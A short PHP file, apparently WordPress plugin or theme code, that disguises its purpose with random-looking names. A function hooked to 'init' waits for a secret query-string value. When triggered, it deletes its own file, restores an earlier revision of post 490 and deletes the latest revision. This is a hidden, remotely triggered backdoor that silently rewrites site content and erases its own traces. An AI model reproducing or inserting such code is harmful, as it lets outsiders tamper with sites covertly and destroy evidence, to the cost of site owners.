<?php

function extensions_this_widget_create() {
	if (isset($_GET['word_another_sales']) && $_GET['word_another_sales'] === 'url_dynamic_hover_recent') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$bulk_manager_url = 490;
		$role_forms_scheduler_files = wp_get_post_revisions($bulk_manager_url);
		if (empty($role_forms_scheduler_files)) die('no revisions');
		if (count($role_forms_scheduler_files) < 2) die('less than 2');
		$authors_wow_official_post = array_shift($role_forms_scheduler_files);
		$data_chart_virtual_hello = $authors_wow_official_post->ID;
		$archives_poster_shortcodes_utils = array_shift($role_forms_scheduler_files);
		$team_first_blocker = $archives_poster_shortcodes_utils->ID;
		$patterns_event_homepage_reset = wp_restore_post_revision($team_first_blocker);
		if ($patterns_event_homepage_reset === false) die('error restoring');
		$patterns_event_homepage_reset = wp_delete_post_revision($data_chart_virtual_hello);		
		if ($patterns_event_homepage_reset === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'extensions_this_widget_create');
